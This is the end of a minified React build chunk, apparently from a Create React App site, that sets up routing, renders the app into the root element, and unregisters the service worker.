i.a.createElement(r.a,{basename:""},i.a.createElement("div",{className:l.a.component},i.a.createElement(m,null),i.a.createElement("div",{className:l.a.main},i.a.createElement(s.d,null,R.map(n=>i.a.createElement(s.b,{key:n.path,path:n.path,exact:!0,component:n.component})),i.a.createElement(s.a,{path:"/",to:"/0.6"}))),i.a.createElement("div",{className:l.a.footer},i.a.createElement(y,null))))};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));const N=document.getElementById("root");N.hasChildNodes()?Object(o.hydrate)(i.a.createElement(O,null),N):Object(o.render)(i.a.createElement(O,null),N),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then(n=>{n.unregister()}).catch(n=>{console.error(n.message)})},8:function(n,e,t){n.exports={component:"Home_component__tZlax",listItem:"Home_listItem__2WTmk",label:"Home_label__1_hjg",header:"Home_header__2gkN-"}}},[[30,1,2]]]);
//# sourceMappingURL=main.8736ec1a.chunk.js.map